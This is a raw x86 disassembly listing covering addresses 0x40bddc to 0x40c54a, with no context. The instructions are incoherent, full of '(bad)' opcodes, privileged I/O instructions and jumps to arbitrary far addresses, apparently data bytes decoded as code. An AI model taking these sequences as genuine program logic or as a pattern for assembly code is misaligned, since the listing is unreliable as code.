  40bddc:	sub    BYTE PTR [eax],cl
  40bdde:	in     al,dx
  40bddf:	dec    esp
  40bde0:	pop    es
  40bde1:	mov    esp,DWORD PTR [eax-0x1b37584c]
  40bde7:	nop
  40bde8:	cli    
  40bde9:	jmp    DWORD PTR [edx]
  40bdeb:	xchg   esi,eax
  40bdec:	jp     0x40bd9d
  40bdee:	cs jl  0x40bde3
  40bdf1:	mov    edx,0x5bec112f
  40bdf6:	sub    dh,BYTE PTR ss:[esi+0x1e]
  40bdfa:	test   al,0x47
  40bdfc:	jnp    0x40be3b
  40bdfe:	push   ss
  40bdff:	xor    bl,al
  40be01:	sub    edi,DWORD PTR [eax]
  40be03:	pushf  
  40be04:	push   eax
  40be05:	push   es
  40be06:	out    0x1c,eax
  40be08:	shl    BYTE PTR [edx-0x24d0aa64],0x61
  40be0f:	or     eax,0x54d894d6
  40be14:	adc    ebx,DWORD PTR [ebp+0xec34da7]
  40be1a:	push   esi
  40be1b:	dec    edi
  40be1c:	mov    ah,0x75
  40be1e:	push   es
  40be1f:	cmp    eax,0xa0362239
  40be24:	jo     0x40be57
  40be26:	mov    bh,0xf1
  40be28:	sbb    DWORD PTR [esi],ebp
  40be2a:	xor    al,0x30
  40be2c:	into   
  40be2d:	xor    BYTE PTR [ecx],ch
  40be2f:	jbe    0x40be64
  40be31:	aam    0xa9
  40be33:	stos   BYTE PTR es:[edi],al
  40be34:	outs   dx,DWORD PTR ds:[esi]
  40be35:	jmp    0xb04737e7
  40be3a:	mov    esi,0x4815b311
  40be3f:	outs   dx,DWORD PTR ds:[esi]
  40be40:	push   edx
  40be41:	mov    dh,0xec
  40be43:	sub    DWORD PTR [esi+0x7fd800f7],0x1e
  40be4a:	inc    esi
  40be4b:	push   cs
  40be4c:	cmp    eax,0xb849c0a2
  40be51:	sub    eax,0x6d88ba83
  40be56:	add    edi,eax
  40be58:	xor    dl,BYTE PTR [edx-0x1c]
  40be5b:	rcl    DWORD PTR ds:0x2ffc90c,cl
  40be61:	add    ch,BYTE PTR [esi]
  40be63:	add    bl,BYTE PTR [esi]
  40be65:	leave  
  40be66:	mov    esi,0x8bc3a3a9
  40be6b:	adc    al,0x4
  40be6d:	and    DWORD PTR [edi],ecx
  40be6f:	inc    edx
  40be70:	data16 mov ch,0x9b
  40be73:	inc    ebx
  40be74:	and    edi,DWORD PTR [eax-0x474049ca]
  40be7a:	(bad)  
  40be7b:	loop   0x40beaf
  40be7d:	scas   al,BYTE PTR es:[edi]
  40be7e:	add    eax,0x53dfb483
  40be83:	test   BYTE PTR [esi+0x54],ah
  40be86:	jmp    0x40beb8
  40be88:	es sub al,0xa8
  40be8b:	xchg   edi,eax
  40be8c:	xor    al,0x30
  40be8e:	jl     0x40bf07
  40be90:	ss call 0xd3fed8a8
  40be96:	popa   
  40be97:	out    0xd5,al
  40be99:	loop   0x40be6b
  40be9b:	lods   al,BYTE PTR ds:[esi]
  40be9c:	pushf  
  40be9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be9e:	leave  
  40be9f:	retf   0x706
  40bea2:	(bad)
  40bea5:	stc    
  40bea6:	popa   
  40bea7:	test   edx,esi
  40bea9:	sub    al,0x69
  40beab:	sbb    dh,ah
  40bead:	imul   ecx,DWORD PTR [ecx],0xffffffce
  40beb0:	pop    ebp
  40beb1:	dec    ebp
  40beb2:	lds    eax,FWORD PTR [edi-0x7de84301]
  40beb8:	xor    al,0xb
  40beba:	or     al,BYTE PTR [esi-0x6b]
  40bebd:	hlt    
  40bebe:	mov    bl,0x58
  40bec0:	ss sub eax,0x19382eb8
  40bec6:	(bad)  
  40bec7:	neg    DWORD PTR [edx]
  40bec9:	sub    al,0x6b
  40becb:	aaa    
  40becc:	and    eax,0xd2533355
  40bed1:	in     eax,0x8b
  40bed3:	push   cs
  40bed4:	jge    0x40bee0
  40bed6:	adc    ah,BYTE PTR [edx-0x2d]
  40bed9:	pop    esi
  40beda:	out    0x40,eax
  40bedc:	jmp    0x40bef1
  40bede:	push   esp
  40bedf:	or     dl,BYTE PTR [eax+esi*4-0x2dbfd448]
  40bee6:	lahf   
  40bee7:	cwde   
  40bee8:	cs inc esp
  40beea:	fstp   TBYTE PTR ds:0xf5baef6e
  40bef0:	les    ebx,FWORD PTR [edx+edi*1+0x77]
  40bef4:	lods   al,BYTE PTR ds:[esi]
  40bef5:	adc    al,BYTE PTR [edi+0x52]
  40bef8:	(bad)  [ebp+0x74880839]
  40befe:	push   ebp
  40beff:	leave  
  40bf00:	xchg   esp,eax
  40bf01:	out    0x47,al
  40bf03:	ret    0x1192
  40bf06:	rol    BYTE PTR [edi-0x33],0xa4
  40bf0a:	sub    al,0xd4
  40bf0c:	push   esi
  40bf0d:	fsubr  DWORD PTR gs:[edx+0x69]
  40bf11:	out    dx,eax
  40bf12:	push   ecx
  40bf13:	je     0x40be96
  40bf15:	stc    
  40bf16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf17:	pop    eax
  40bf18:	xor    cl,BYTE PTR [ecx*4-0x19ecbdf8]
  40bf1f:	(bad)  
  40bf20:	stc    
  40bf21:	push   ebx
  40bf22:	inc    esp
  40bf23:	pop    ecx
  40bf24:	retf   0xbbc3
  40bf27:	iret   
  40bf28:	ins    BYTE PTR es:[edi],dx
  40bf29:	lahf   
  40bf2a:	movlps QWORD PTR [ebp+0x4a094736],xmm4
  40bf31:	addr16 pop ebx
  40bf33:	and    ch,dl
  40bf35:	jmp    0x40beff
  40bf37:	(bad)  
  40bf39:	push   edi
  40bf3a:	sub    al,0xf6
  40bf3c:	jmp    0x40befc
  40bf3e:	je     0x40bf83
  40bf40:	xchg   edx,eax
  40bf41:	jbe    0x40befb
  40bf43:	push   ds
  40bf44:	push   0xffffffb7
  40bf46:	les    esi,FWORD PTR [esi+0x72]
  40bf49:	(bad)
  40bf4c:	xlat   BYTE PTR ds:[ebx]
  40bf4d:	sbb    eax,0x8a1e123a
  40bf52:	repz imul esp,DWORD PTR [edi+0x71],0xe13b6c08
  40bf5a:	inc    ecx
  40bf5b:	sub    eax,0x6c288f58
  40bf60:	dec    esi
  40bf61:	sub    DWORD PTR [ecx-0x15d86d58],ebp
  40bf67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf68:	repnz mov bh,0x64
  40bf6b:	(bad)  [edi+esi*8+0xf]
  40bf6f:	jle    0x40bfbe
  40bf71:	mov    esi,ebx
  40bf73:	jno    0x40bf2f
  40bf75:	dec    ecx
  40bf76:	jo     0x40bfe6
  40bf78:	int    0xa7
  40bf7a:	fsubp  st(4),st
  40bf7c:	xchg   ebp,eax
  40bf7d:	mov    bl,0x90
  40bf7f:	jbe    0x40bf85
  40bf81:	adc    edi,DWORD PTR [si+0x78ca]
  40bf86:	push   0xd52a992
  40bf8b:	in     eax,0xd2
  40bf8d:	push   edi
  40bf8e:	or     eax,0x7a83ce2b
  40bf93:	add    DWORD PTR [ebx],esp
  40bf95:	rcl    dl,1
  40bf97:	inc    ebp
  40bf98:	mov    al,ds:0x3cf6f63c
  40bf9d:	jae    0x40bfac
  40bf9f:	pop    edx
  40bfa0:	jp     0x40bf6a
  40bfa2:	leave  
  40bfa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfa4:	dec    edx
  40bfa5:	int    0xe
  40bfa7:	mov    eax,ds:0xbd48878a
  40bfac:	and    esi,edi
  40bfae:	fnstenv ds:0x68087947
  40bfb4:	out    0x92,al
  40bfb6:	lods   eax,DWORD PTR ds:[esi]
  40bfb7:	ds int3 
  40bfb9:	adc    eax,0x60e2e65e
  40bfbe:	repnz and al,0x83
  40bfc1:	dec    esi
  40bfc2:	dec    esi
  40bfc3:	lods   eax,DWORD PTR ds:[esi]
  40bfc4:	add    BYTE PTR [edx+eax*1+0x50],al
  40bfc8:	or     eax,0x90a2f545
  40bfcd:	lods   al,BYTE PTR ds:[esi]
  40bfce:	or     esp,DWORD PTR [eax+0x51]
  40bfd1:	push   esp
  40bfd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfd3:	xor    esp,esp
  40bfd5:	inc    eax
  40bfd6:	inc    edx
  40bfd7:	adc    DWORD PTR [eax+0x6f7b8e29],ebx
  40bfdd:	loope  0x40c033
  40bfdf:	sysret 
  40bfe1:	scas   al,BYTE PTR es:[edi]
  40bfe2:	pop    esi
  40bfe3:	jns    0x40bf93
  40bfe5:	push   esi
  40bfe6:	add    al,0xac
  40bfe8:	mov    BYTE PTR [ecx],ch
  40bfea:	xor    BYTE PTR [ebx+0x7236d20e],cl
  40bff0:	mov    BYTE PTR [edx+0x53bf52a],bl
  40bff6:	test   eax,0x7231c1d2
  40bffb:	jne    0x40c04f
  40bffd:	rcr    BYTE PTR [ebx],0xec
  40c000:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c001:	jl     0x40c063
  40c003:	xchg   edi,eax
  40c004:	jg     0x40c025
  40c006:	daa    
  40c007:	xchg   ecx,eax
  40c008:	sbb    eax,0x6d475440
  40c00d:	cmp    ebx,edi
  40c00f:	mov    cl,0xb6
  40c011:	stos   DWORD PTR es:[edi],eax
  40c012:	cmp    dh,BYTE PTR [esi-0x4c]
  40c015:	jmp    0xb3be:0x113a2d51
  40c01c:	xchg   edx,eax
  40c01d:	and    bl,BYTE PTR [esp+ebp*2+0x58]
  40c021:	push   ss
  40c022:	out    0x4b,al
  40c024:	mov    ds:0xcee9a4ca,al
  40c029:	adc    eax,0x575c040f
  40c02e:	push   ds
  40c02f:	sbb    esi,DWORD PTR [eax-0x58]
  40c032:	dec    ecx
  40c033:	jno    0x40bff7
  40c035:	mov    esp,0xb83a3823
  40c03a:	sub    DWORD PTR [edx+edx*4+0x64],esi
  40c03e:	jecxz  0x40c0b6
  40c040:	lods   eax,DWORD PTR ds:[esi]
  40c041:	inc    ebx
  40c042:	aad    0xa4
  40c044:	out    0xc9,al
  40c046:	ret    
  40c047:	push   ss
  40c048:	stos   DWORD PTR es:[edi],eax
  40c049:	xor    BYTE PTR ds:0xcaf23e4f,dh
  40c04f:	or     al,0xd2
  40c051:	adc    BYTE PTR [esi],ah
  40c053:	fwait
  40c054:	mov    dh,BYTE PTR [edi-0x21]
  40c057:	aas    
  40c058:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c059:	cmp    eax,0x4046d575
  40c05e:	inc    ebx
  40c060:	sar    BYTE PTR [edx-0x11274d1b],0xc5
  40c067:	cmp    al,0x1
  40c069:	sbb    eax,0x9861e32a
  40c06e:	sub    ecx,DWORD PTR [edx-0x16ea908a]
  40c074:	cli    
  40c075:	mov    eax,ds:0x1ec4d442
  40c07a:	pop    ds
  40c07b:	mov    ds:0x14945617,al
  40c080:	jae    0x40c0b2
  40c082:	or     ah,0x1c
  40c085:	fimul  WORD PTR [ebp+0x4cd1affa]
  40c08b:	std    
  40c08c:	cs jbe 0x40c0ba
  40c08f:	adc    dl,bl
  40c091:	leave  
  40c092:	repz imul ecx,DWORD PTR [eax+0x4687d69b],0xd6a7f2ac
  40c09d:	iret   
  40c09e:	xor    al,0x1e
  40c0a0:	cmp    edx,DWORD PTR cs:0xc85ea12c
  40c0a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0a8:	sbb    esi,DWORD PTR [esi]
  40c0aa:	mov    cs,WORD PTR [esi+0x6c8cd1da]
  40c0b0:	loope  0x40c06c
  40c0b2:	lods   al,BYTE PTR ds:[esi]
  40c0b3:	jmp    0x7178b91b
  40c0b8:	test   bh,ch
  40c0ba:	pop    ds
  40c0bb:	fsub   QWORD PTR [eax+ebp*2+0x7680a04f]
  40c0c2:	xchg   ebp,eax
  40c0c3:	pop    ecx
  40c0c4:	add    ah,BYTE PTR [eax+ebp*4]
  40c0c7:	mov    cl,0x78
  40c0c9:	add    al,0x4a
  40c0cb:	xchg   edi,eax
  40c0cc:	dec    esi
  40c0cd:	mov    esp,0x1e2b3118
  40c0d2:	mov    ?,WORD PTR [ebp+0x2c]
  40c0d5:	inc    ecx
  40c0d6:	shl    DWORD PTR [ebp+0x2e1bfc7b],cl
  40c0dc:	xlat   BYTE PTR ds:[ebx]
  40c0dd:	mov    esp,DWORD PTR [eax-0x77]
  40c0e0:	jb     0x40c132
  40c0e2:	test   dh,al
  40c0e4:	fistp  DWORD PTR [eax+0x2a0e73a]
  40c0ea:	mov    dh,BYTE PTR fs:[ebx-0x2b22579]
  40c0f1:	loop   0x40c0ff
  40c0f3:	daa    
  40c0f4:	fcmovnu st,st(6)
  40c0f6:	fld    DWORD PTR [esi]
  40c0f8:	fldcw  WORD PTR [edi+0x7c9a1fe3]
  40c0fe:	lock mov esi,0x4e1a4ccf
  40c104:	and    al,0x1d
  40c106:	mov    ebx,0x7d52d44c
  40c10b:	sub    al,0xc
  40c10d:	stc    
  40c10e:	and    DWORD PTR [ecx],ecx
  40c110:	std    
  40c111:	inc    esi
  40c112:	ds push ss
  40c114:	aam    0xb
  40c116:	into   
  40c117:	daa    
  40c118:	sub    DWORD PTR [edi-0x4a],0x82814857
  40c11f:	mov    dl,0x3
  40c121:	outs   dx,DWORD PTR ds:[esi]
  40c122:	inc    ebx
  40c123:	sub    eax,ebp
  40c125:	adc    dl,bl
  40c127:	popf   
  40c128:	push   edi
  40c129:	and    dh,BYTE PTR [edi]
  40c12b:	data16 loopne 0x40c0b3
  40c12e:	mov    DWORD PTR [ebp+edx*1-0x31c4038b],ebp
  40c135:	and    eax,0x7ae1d2f5
  40c13a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c13b:	xchg   edi,eax
  40c13c:	sub    BYTE PTR [ebp+0x7a],0xc9
  40c140:	adc    ch,dl
  40c142:	lds    ebp,FWORD PTR [ecx-0x34]
  40c145:	push   0xce14b031
  40c14a:	icebp  
  40c14b:	cld    
  40c14c:	mov    ebp,0x86c0ace1
  40c151:	imul   DWORD PTR [ebp+0x6d]
  40c154:	ins    BYTE PTR es:[edi],dx
  40c155:	iret   
  40c156:	test   cl,dh
  40c158:	pop    ds
  40c159:	pop    ebp
  40c15a:	xchg   edx,eax
  40c15b:	jno    0x40c1bd
  40c15d:	sbb    BYTE PTR [esi-0x3c407514],ah
  40c163:	popa   
  40c164:	xor    cl,BYTE PTR [ebx+edx*2]
  40c167:	mov    esi,0x33a18d41
  40c16c:	sub    DWORD PTR [ebx-0x5ea1735a],0x5da0a85e
  40c176:	mov    gs,ebx
  40c178:	cmp    dh,BYTE PTR [ebp+0xab7faa8]
  40c17e:	daa    
  40c17f:	pop    ecx
  40c180:	lahf   
  40c181:	mov    dh,0xff
  40c183:	dec    edx
  40c184:	adc    dl,al
  40c186:	pushf  
  40c187:	ror    DWORD PTR [esi],1
  40c189:	push   ss
  40c18a:	shl    bl,0x4
  40c18d:	dec    ebx
  40c18e:	xchg   DWORD PTR [esi],edi
  40c190:	enter  0xdcfe,0x19
  40c194:	stos   DWORD PTR es:[edi],eax
  40c195:	cmp    al,0xcd
  40c197:	xor    al,0xea
  40c199:	aas    
  40c19a:	inc    esi
  40c19b:	adc    bh,BYTE PTR [edx]
  40c19d:	jmp    0x95d9fc75
  40c1a2:	sub    esp,DWORD PTR [eax-0x30c8bbfd]
  40c1a8:	add    al,0x79
  40c1aa:	pop    DWORD PTR [edi-0x6e]
  40c1ad:	sub    eax,0xbb2864bd
  40c1b2:	call   0xd6ca:0x3eea1d5a
  40c1b9:	mov    ebp,0xf615a751
  40c1be:	sub    ebp,DWORD PTR [edx-0x3a]
  40c1c1:	ret    0xfc64
  40c1c4:	stos   BYTE PTR es:[edi],al
  40c1c5:	or     al,0x50
  40c1c7:	lea    edi,[ecx+0x4a0a6ba]
  40c1cd:	mov    bh,0xef
  40c1cf:	retf   0x1d15
  40c1d2:	sahf   
  40c1d3:	mov    ds:0x7375b092,al
  40c1d8:	aam    0xc5
  40c1da:	inc    ebp
  40c1db:	add    eax,0x46287908
  40c1e0:	js     0x40c1c3
  40c1e2:	fs std 
  40c1e4:	ret    0x182e
  40c1e7:	fs das 
  40c1e9:	fwait
  40c1ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1eb:	in     eax,dx
  40c1ec:	inc    eax
  40c1ed:	adc    al,0x73
  40c1ef:	repz fisubr DWORD PTR [ebx]
  40c1f2:	add    cx,si
  40c1f5:	call   0x4215:0x49a51da6
  40c1fc:	and    eax,0xb47e248a
  40c201:	sbb    edi,0xffffff91
  40c204:	sub    ebx,eax
  40c206:	in     eax,dx
  40c207:	mov    esp,0xe39eddcf
  40c20c:	ud1    edi,DWORD PTR ds:0x34554c9b
  40c213:	xor    al,0x1f
  40c215:	inc    ecx
  40c216:	leave  
  40c217:	out    dx,eax
  40c218:	sub    al,0x16
  40c21a:	jp     0x40c1ef
  40c21c:	lea    edx,ds:0xfcb0f032
  40c223:	and    BYTE PTR ds:0x240ac914,ah
  40c229:	jmp    0x2c2f:0xf330ec0a
  40c230:	js     0x40c1c5
  40c232:	mov    eax,ds:0x7157f55c
  40c237:	jne    0x40c1e0
  40c239:	adc    dl,BYTE PTR [edx-0x1e1d97cc]
  40c23f:	jno    0x40c27b
  40c241:	jbe    0x40c225
  40c243:	push   ds
  40c244:	pop    ss
  40c245:	aam    0x4e
  40c247:	test   BYTE PTR [ecx],dh
  40c249:	xor    al,0x44
  40c24b:	outs   dx,DWORD PTR ds:[esi]
  40c24c:	pop    ebx
  40c24d:	jae    0x40c2b4
  40c24f:	mul    BYTE PTR [eax+0x508c00bb]
  40c255:	push   ebx
  40c256:	ret    
  40c257:	xchg   edx,eax
  40c258:	scas   eax,DWORD PTR es:[edi]
  40c259:	mov    al,ds:0x1b863f45
  40c25e:	in     al,dx
  40c25f:	sahf   
  40c260:	fcom   DWORD PTR [ebx+0x54595bbf]
  40c266:	push   edi
  40c267:	mov    ds:0xb3885b43,eax
  40c26c:	push   ebx
  40c26d:	and    al,0xb4
  40c26f:	jecxz  0x40c217
  40c271:	scas   al,BYTE PTR es:[edi]
  40c272:	push   0xffffffc2
  40c274:	setl   bl
  40c277:	xchg   BYTE PTR ds:0x7959f59d,ch
  40c27d:	sti    
  40c27e:	and    al,0x26
  40c280:	inc    ebx
  40c281:	or     dh,BYTE PTR [edx+0x692886d5]
  40c287:	mov    esi,0x945b28c1
  40c28c:	cmp    al,0x4b
  40c28e:	(bad)  
  40c28f:	lods   al,BYTE PTR ds:[esi]
  40c290:	pop    ebp
  40c291:	mov    BYTE PTR [ebp+0x64],cl
  40c294:	les    eax,FWORD PTR [esi+esi*1]
  40c297:	mov    ah,0x7c
  40c299:	mov    cl,0x72
  40c29b:	sahf   
  40c29c:	sbb    DWORD PTR [eax-0x48],eax
  40c29f:	clc    
  40c2a0:	push   ecx
  40c2a1:	push   0x4c
  40c2a3:	iret   
  40c2a4:	rcl    DWORD PTR [edi],0xdb
  40c2a7:	jno    0x40c234
  40c2a9:	jnp    0x40c31a
  40c2ab:	sbb    DWORD PTR [edx-0x69],edi
  40c2ae:	std    
  40c2af:	add    bh,BYTE PTR [edx-0x52]
  40c2b2:	push   0x4e
  40c2b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2b5:	cwde   
  40c2b6:	xchg   esp,eax
  40c2b7:	push   edi
  40c2b8:	lock or eax,0x2a9267ec
  40c2be:	iret   
  40c2bf:	sbb    esp,DWORD PTR [esi]
  40c2c1:	stos   DWORD PTR es:[edi],eax
  40c2c2:	loopne 0x40c267
  40c2c4:	dec    eax
  40c2c5:	(bad)  
  40c2c6:	shl    BYTE PTR [ebx],cl
  40c2c8:	add    dl,BYTE PTR [ebp+0xa]
  40c2cb:	mov    DWORD PTR [eax],esi
  40c2cd:	push   cs
  40c2ce:	les    ecx,FWORD PTR [ecx]
  40c2d0:	cmp    al,0xa0
  40c2d2:	sub    DWORD PTR [ecx+eax*8+0x2c],eax
  40c2d6:	in     eax,0xde
  40c2d8:	aad    0x93
  40c2da:	fs sbb al,0xa1
  40c2dd:	or     eax,0xe2d48c2e
  40c2e2:	(bad)  
  40c2e3:	jecxz  0x40c321
  40c2e5:	mov    dl,0x69
  40c2e7:	mov    DWORD PTR [ecx+esi*4-0x670f6c12],ebx
  40c2ee:	pop    es
  40c2ef:	div    bh
  40c2f1:	daa    
  40c2f2:	xchg   edi,eax
  40c2f3:	dec    edi
  40c2f4:	inc    esp
  40c2f5:	and    eax,edi
  40c2f7:	out    dx,eax
  40c2f8:	mov    edx,0xa1e89a29
  40c2fd:	push   edx
  40c2fe:	js     0x40c2e3
  40c300:	mov    esi,0x5a616eb2
  40c305:	ins    DWORD PTR es:[edi],dx
  40c306:	inc    edi
  40c307:	pop    edi
  40c308:	sbb    bh,BYTE PTR [ebx]
  40c30a:	xor    dl,BYTE PTR [ecx-0x39]
  40c30d:	into   
  40c30e:	aaa    
  40c30f:	inc    ecx
  40c310:	mov    edx,0x1bc18889
  40c315:	pop    ecx
  40c316:	add    ebp,edx
  40c318:	xor    al,0x4c
  40c31a:	or     edi,DWORD PTR [ecx+0x1409548a]
  40c320:	aaa    
  40c321:	mov    ?,WORD PTR ds:0x50bbc99a
  40c327:	mov    al,gs:0xf4a8d173
  40c32d:	stos   BYTE PTR es:[edi],al
  40c32e:	ret    0x1b3c
  40c331:	pop    eax
  40c332:	xchg   ebp,eax
  40c333:	mov    al,ds:0x7964f4c5
  40c338:	es retf 
  40c33a:	lsl    edi,dx
  40c33d:	or     ah,ch
  40c33f:	repnz push 0x43bb6df5
  40c345:	stos   BYTE PTR es:[edi],al
  40c346:	cdq    
  40c347:	in     al,0xc1
  40c349:	(bad)  
  40c34a:	fsubr  DWORD PTR [eax-0x31ca2996]
  40c350:	and    BYTE PTR [ecx],cl
  40c352:	shl    BYTE PTR [esi],cl
  40c354:	mov    ecx,0xe4d78a85
  40c359:	enter  0xdb85,0x7e
  40c35d:	jb     0x40c305
  40c35f:	xchg   ecx,eax
  40c360:	cli    
  40c361:	ins    BYTE PTR es:[edi],dx
  40c362:	(bad)  
  40c363:	iret   
  40c364:	ds mov eax,0x8cd9d7a1
  40c36a:	jmp    0x40c377
  40c36c:	inc    eax
  40c36d:	dec    edi
  40c36e:	lea    ecx,[esi+0x22]
  40c371:	pop    ds
  40c372:	adc    al,0x93
  40c374:	stos   BYTE PTR es:[edi],al
  40c375:	and    al,0x38
  40c377:	xchg   ecx,eax
  40c378:	lea    esi,[ecx+0x23]
  40c37b:	popf   
  40c37c:	pushf  
  40c37d:	jbe    0x40c3f2
  40c37f:	popa   
  40c380:	push   ss
  40c381:	test   DWORD PTR [esi+0x32],ecx
  40c384:	jp     0x40c3ff
  40c386:	repnz add eax,0x3fd3b1ab
  40c38c:	(bad)  
  40c38e:	test   al,0x2f
  40c390:	jae    0x40c3e8
  40c392:	xor    eax,0x91b3e66a
  40c397:	les    edx,FWORD PTR [ebp+0x686c347b]
  40c39d:	or     al,0x4f
  40c39f:	out    dx,al
  40c3a0:	pop    edi
  40c3a1:	mov    edx,0x1397eaa5
  40c3a6:	rcr    DWORD PTR [eax+0x59],0xbd
  40c3aa:	inc    ecx
  40c3ab:	mov    bl,0xa5
  40c3ad:	xchg   dh,dl
  40c3af:	mov    cl,0x8f
  40c3b1:	rol    DWORD PTR ss:[edx+0x805351],1
  40c3b8:	fwait
  40c3b9:	add    dl,BYTE PTR [ebp+0xa2453b9]
  40c3bf:	mov    eax,0x2333372b
  40c3c4:	test   DWORD PTR [eax],0xc70aaa20
  40c3ca:	ffree  st(5)
  40c3cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3cd:	mov    ds,eax
  40c3cf:	ret    
  40c3d0:	loop   0x40c40e
  40c3d2:	jae    0x40c434
  40c3d4:	xchg   edx,eax
  40c3d5:	out    dx,al
  40c3d6:	mov    ebx,DWORD PTR [eax-0x174de9cb]
  40c3dc:	or     eax,DWORD PTR [esp+eiz*2+0xc]
  40c3e0:	test   al,0xaa
  40c3e2:	ficom  DWORD PTR [ebp-0x23]
  40c3e5:	test   BYTE PTR [esi+0x1294f55f],dl
  40c3eb:	popa   
  40c3ec:	adc    DWORD PTR [ebx],eax
  40c3ee:	pop    ecx
  40c3ef:	mov    edi,0xba80ffa9
  40c3f4:	ret    0x6ad9
  40c3f7:	and    ch,al
  40c3f9:	jmp    0xb20d84c0
  40c3fe:	aas    
  40c3ff:	mov    cl,0xb4
  40c401:	arpl   WORD PTR [ebx+edi*8],sp
  40c404:	lock jo 0x40c400
  40c407:	outs   dx,BYTE PTR ds:[esi]
  40c408:	dec    eax
  40c409:	mov    bh,0xd6
  40c40b:	adc    eax,0xd309eaaf
  40c410:	stc    
  40c411:	xor    eax,0xf78b7fc8
  40c416:	mov    ds:0x76dbc638,eax
  40c41b:	repz scas al,BYTE PTR es:[di]
  40c41e:	jb     0x40c42a
  40c420:	bound  esi,QWORD PTR [ebp-0x26]
  40c423:	out    0x4d,eax
  40c425:	fadd   DWORD PTR [eiz*1-0x1f9926f1]
  40c42c:	cmp    DWORD PTR [ebx],ecx
  40c42e:	daa    
  40c42f:	pop    eax
  40c430:	cmp    DWORD PTR es:[ecx+edx*1],ebp
  40c434:	aad    0xa6
  40c436:	fisubr WORD PTR [edi+0x14]
  40c439:	js     0x40c3cd
  40c43b:	sbb    dh,BYTE PTR [esi+ebp*1]
  40c43e:	retf   0x7162
  40c441:	shr    DWORD PTR [ecx-0xb],cl
  40c444:	ja     0x40c46d
  40c446:	jns    0x40c41b
  40c448:	js     0x40c43a
  40c44a:	or     al,0x80
  40c44c:	push   ebx
  40c44d:	mov    ah,0xe8
  40c44f:	leave  
  40c450:	outs   dx,DWORD PTR ds:[esi]
  40c451:	fidivr DWORD PTR [ebp+0x53]
  40c454:	xor    al,0x7c
  40c456:	loop   0x40c4bd
  40c458:	arpl   WORD PTR [ebp+0x4aa347c4],sp
  40c45e:	inc    ebp
  40c45f:	fistp  DWORD PTR [edi-0x5e]
  40c462:	mov    ch,0xb6
  40c464:	cdq    
  40c465:	rcr    BYTE PTR [edi-0x24f1d4a1],0x94
  40c46c:	arpl   WORD PTR [esi+0x5b21f885],sp
  40c472:	das    
  40c473:	int    0xe6
  40c475:	loop   0x40c4f5
  40c477:	fwait
  40c478:	mov    eax,ds:0xb3f13f76
  40c47d:	cmp    al,0x7
  40c47f:	xor    dh,BYTE PTR [esi-0x16]
  40c482:	mov    ebp,0x9f7b10a2
  40c487:	sbb    ch,BYTE PTR [ebx+0x1613d5b8]
  40c48d:	jns    0x40c46a
  40c48f:	in     eax,dx
  40c490:	pop    edx
  40c491:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c492:	sti    
  40c493:	xchg   ebx,eax
  40c494:	pop    esp
  40c495:	popa   
  40c496:	or     ecx,DWORD PTR [ecx]
  40c498:	sbb    eax,0x2a398f53
  40c49d:	imul   DWORD PTR [ecx-0x7b]
  40c4a0:	mov    ebx,0x5e65610d
  40c4a5:	in     eax,0xf6
  40c4a7:	push   esp
  40c4a8:	ins    DWORD PTR es:[edi],dx
  40c4a9:	cmp    al,0xbe
  40c4ab:	dec    ecx
  40c4ac:	in     al,0x42
  40c4ae:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40c4b0:	and    BYTE PTR [ecx-0x4c],bh
  40c4b3:	push   cs
  40c4b4:	fist   WORD PTR [eax-0x5f7f4fce]
  40c4ba:	inc    ebx
  40c4bb:	xchg   esp,eax
  40c4bc:	pop    ebp
  40c4bd:	pop    ebx
  40c4be:	je     0x40c50a
  40c4c0:	leave  
  40c4c1:	sbb    BYTE PTR [eax],ch
  40c4c3:	adc    ecx,DWORD PTR [ebp-0x48bd7451]
  40c4c9:	rcl    BYTE PTR [ecx-0x1bd31ebe],0x45
  40c4d0:	dec    edx
  40c4d1:	addr16 pop ebp
  40c4d3:	jge    0x40c4f0
  40c4d5:	or     al,BYTE PTR [eax]
  40c4d7:	inc    esp
  40c4d8:	inc    ebp
  40c4d9:	push   cs
  40c4da:	imul   edi,esi,0xb563e18e
  40c4e0:	stos   DWORD PTR es:[edi],eax
  40c4e1:	outs   dx,BYTE PTR ds:[esi]
  40c4e2:	pop    ds
  40c4e3:	adc    DWORD PTR ds:0x23866880,ebp
  40c4e9:	mov    ds:0xb7ca7a85,al
  40c4ee:	mov    edx,0xe5b3e61b
  40c4f3:	cmp    eax,0x987696f9
  40c4f8:	adc    eax,0x5b7bf068
  40c4fd:	aas    
  40c4fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4ff:	test   BYTE PTR [edi],al
  40c501:	sub    BYTE PTR [ebp+0x5365bb46],dh
  40c507:	loope  0x40c4da
  40c509:	retf   0x9f6f
  40c50c:	lods   eax,DWORD PTR ds:[esi]
  40c50d:	test   di,di
  40c510:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c511:	shr    DWORD PTR [ecx+0x4d],cl
  40c514:	outs   dx,BYTE PTR ds:[esi]
  40c515:	jmp    0x40c510
  40c517:	xor    DWORD PTR [ebp-0x26],0xffffffbb
  40c51b:	mov    ds:0xabc520b1,al
  40c520:	adc    al,0x10
  40c522:	fdiv   DWORD PTR [edx]
  40c524:	(bad)  
  40c525:	fnstsw WORD PTR [ecx-0x2ce89c8b]
  40c52b:	ret    0xfafa
  40c52e:	cwde   
  40c52f:	mov    eax,ds:0xcd2d2630
  40c534:	jo     0x40c5ab
  40c536:	push   edi
  40c537:	mov    dl,0x5b
  40c539:	mov    DWORD PTR [eax+0x7a9f1e2],0xadf32ec8
  40c543:	popf   
  40c544:	cld    
  40c545:	and    al,BYTE PTR [esi+esi*8]
  40c548:	or     edx,DWORD PTR [esi]
  40c54a:	inc    ecx
